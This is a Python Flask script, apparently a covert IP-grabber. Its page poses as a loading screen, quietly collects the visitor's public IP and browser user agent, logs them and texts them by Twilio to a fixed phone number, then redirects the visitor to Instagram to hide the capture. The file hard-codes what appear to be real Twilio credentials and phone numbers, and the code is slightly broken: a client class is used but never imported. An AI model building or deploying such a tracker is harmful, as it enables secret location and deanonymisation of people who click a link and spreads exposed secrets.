from flask import Flask, request, redirect, jsonify
import json
from datetime import datetime
# from twilio.rest import Client  # Décommente si tu veux tester l'envoi réel

app = Flask(__name__)

# === Twilio config ===
account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
from_phone_number = '+12524866318'
to_phone_number = '+33635960569'

client = Client(account_sid, auth_token)  # Décommente pour test réel

def send_sms(ip_address, user_agent):
    body = f"IP Address: {ip_address}\nUser Agent: {user_agent}"
    print(f"[SIMULATION] Envoi du SMS :\n{body}")
    # Pour envoyer réellement, décommente :
    # try:
    #     message = client.messages.create(
    #         body=body,
    #         from_=from_phone_number,
    #         to=to_phone_number
    #     )
    #     print(f"[SUCCÈS] Message envoyé : {message.sid}")
    # except Exception as e:
    #     print(f"[ERREUR] Envoi SMS : {e}")

    # Enregistrement dans un fichier
    with open("log.txt", "a") as f:
        f.write(f"{datetime.now()} - IP: {ip_address} - UA: {user_agent}\n")

@app.route('/')
def index():
    return '''
    <html>
        <head><title>Loading...</title></head>
        <body>
            <h1>Chargement...</h1>
            <script>
                fetch('https://api.ipify.org?format=json')
                    .then(res => res.json())
                    .then(data => {
                        console.log("IP publique récupérée :", data.ip);
                        fetch('/log_ip', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                ip: data.ip,
                                user_agent: navigator.userAgent
                            })
                        }).then(() => {
                            window.location.href = 'https://www.instagram.com';
                        });
                    });
            </script>
        </body>
    </html>
    '''

@app.route('/log_ip', methods=['POST'])
def log_ip():
    data = request.get_json()
    ip = data.get("ip", "N/A")
    user_agent = data.get("user_agent", "N/A")
    print(f"[INFO] IP reçue via JS : {ip} - UA : {user_agent}")
    send_sms(ip, user_agent)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
